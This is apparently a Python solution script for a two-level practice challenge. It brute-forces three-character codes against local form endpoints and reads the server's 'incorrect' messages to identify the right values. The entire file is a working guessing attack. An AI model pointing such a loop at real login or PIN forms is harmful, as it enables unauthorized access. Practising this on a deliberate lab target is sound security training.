import requests


url = 'http://127.0.0.1:5000/level1_submit'  



ascii_='abcdefghijklmnopqrstuvwxyz0123456789'

code='';i=-1;j=-1;k=-1

notbroken=True
while notbroken and i+1<len(ascii_):
    i+=1;j=-1
    while notbroken and j+1<len(ascii_):
        j+=1;k=-1
        while notbroken and k+1<len(ascii_):
            k+=1
            
            code=ascii_[i]+ascii_[j]+ascii_[k]
            data = {'code': code}

            response = requests.post(url, data=data)                
            
            if 'Incorrect' not in response.text:
                print('level 1:',code)
                notbroken=False
            
            code=ascii_[j]+ascii_[i]+ascii_[k]
            data = {'code': code}

            response = requests.post(url, data=data)                
            
            if 'Incorrect' not in response.text:
                print('level 1:',code)
                notbroken=False
            
            code=ascii_[k]+ascii_[j]+ascii_[i]
            data = {'code': code}

            response = requests.post(url, data=data)                
            
            if 'Incorrect' not in response.text:
                print('level 1:',code)
                notbroken=False
     
url = 'http://127.0.0.1:5000/level2_submit'  
          
first='';second='';i=-1;j=-1;k=-1
notbroken=True
while notbroken and i+1<len(ascii_):
    i+=1;j=-1
    while notbroken and j+1<len(ascii_):
        j+=1;k=-1
        while notbroken and k+1<len(ascii_):
            k+=1
            if first!='':
                code1=first
            if second!='':
                code2=second
                
            code1=code2=ascii_[i]+ascii_[j]+ascii_[k]
            data = {'code1': code1, 'code2': code2}

            #print(code1,code2)
            response = requests.post(url, data=data)                

            if 'incorrect' not in response.text:
                notbroken=False
            elif 'The first code is incorrect. Please try again.' in response.text:
                second=code2
            elif 'The second code is incorrect. Please try again.' in response.text:
                first=code1
                
            code1=code2=ascii_[j]+ascii_[i]+ascii_[k]
            data = {'code1': code1, 'code2': code2}


            response = requests.post(url, data=data)                
            
            if 'incorrect' not in response.text:
                notbroken=False
            elif 'The first code is incorrect. Please try again.' in response.text:
                second=code2
            elif 'The second code is incorrect. Please try again.' in response.text:
                first=code1
                
            code1=code2=ascii_[k]+ascii_[j]+ascii_[i]
            data = {'code1': code1, 'code2': code2}


            response = requests.post(url, data=data)                
            
            if 'incorrect' not in response.text:
                notbroken=False
            elif 'The first code is incorrect. Please try again.' in response.text:
                second=code2
            elif 'The second code is incorrect. Please try again.' in response.text:
                first=code1
                
print('level 2:',first,second)
